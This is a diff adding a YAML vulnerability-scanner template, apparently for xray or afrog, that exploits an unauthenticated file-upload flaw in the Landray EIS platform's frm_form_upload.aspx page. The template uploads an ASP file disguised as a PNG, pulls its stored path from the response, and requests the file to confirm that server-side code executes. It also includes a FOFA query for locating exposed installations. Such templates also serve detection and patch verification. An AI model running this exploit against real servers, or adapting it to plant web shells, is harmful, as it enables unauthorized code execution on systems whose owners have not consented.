@@ -1,0 +1,60 @@
+id: poc-yaml-landray-eis-frm-form-upload-aspx-uploadfile
+info:
+  name: 蓝凌EIS智慧协同平台 frm_form_upload.aspx 文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 蓝凌EIS
+  fofa: app="Landray-EIS智慧协同平台"
+variables:
+  content: random_str(32)
+requests:
+- method: POST
+  path: /frm/frm_form_upload.aspx
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------zbm72vc8hf9uqmb5f6yr
+    Cookie: FIOA_IMG_FOLDER=FI
+  data: '-----------------------------zbm72vc8hf9uqmb5f6yr
+
+    Content-Disposition: form-data; name="__VIEWSTATE"
+
+
+    /wEPDwUKMTgyMDI2MjI1NQ9kFgJmD2QWAgIBDw8WAh4EVGV4dAUG5L+d5a2YZGRk0b9dFZuWblLyitK8Fh6njh8H4xA=
+
+    -----------------------------zbm72vc8hf9uqmb5f6yr
+
+    Content-Disposition: form-data; name="__EVENTTARGET"
+
+
+    GB_SAVE
+
+    -----------------------------zbm72vc8hf9uqmb5f6yr
+
+    Content-Disposition: form-data; name="__EVENTARGUMENT"
+
+
+    保存
+
+    -----------------------------zbm72vc8hf9uqmb5f6yr
+
+    Content-Disposition: form-data; name="tpfile"; filename="qwe.asp"
+
+    Content-Type: image/png
+
+
+    <% Response.Write("{{.content}}") %>
+
+    -----------------------------zbm72vc8hf9uqmb5f6yr--
+
+    '
+  expression: status_code == 200 && contains(body,"updateOpenerImg")
+  output:
+  - regex_match(body,"{ updateOpenerImg\\('(?P<t1>.*?)'\\); }")
+- method: GET
+  path: /frm/{{.t1}}
+  expression: 'status_code == 200 &&
+
+    contains(body,content)
+
+    '
+transport: http
